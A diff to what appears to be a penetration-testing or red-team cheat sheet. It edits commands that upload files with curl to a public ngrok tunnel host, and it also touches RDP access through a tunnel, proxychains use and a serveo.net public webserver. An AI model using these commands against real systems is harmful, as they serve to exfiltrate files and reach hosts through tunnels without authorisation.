@@ -286,8 +286,8 @@ if __name__ == "__main__":
 from new terminal --> xfreerdp /v:localhost:<22> /u:<> /p:<>
 ---------------------------------------------------------------------------------------------------------------
 Transfer file using curl externally :
-proxychains4 python file_upload_server.py <forwarded port 4444>
-curl -F "files=@<os.exe>" http://<4.tcp.eu.ngrok.io>:<15881>
+python file_upload_server.py <forwarded port 8080>
+curl -F "file=@o.txt" https://<e88e-5-149-250-239.ngrok-free.app>
 ---------------------------------------------------------------------------------------------------------------
 To gain a temporarily public webserver using serveo.net and ssh :
 1- sudo service apache2 start
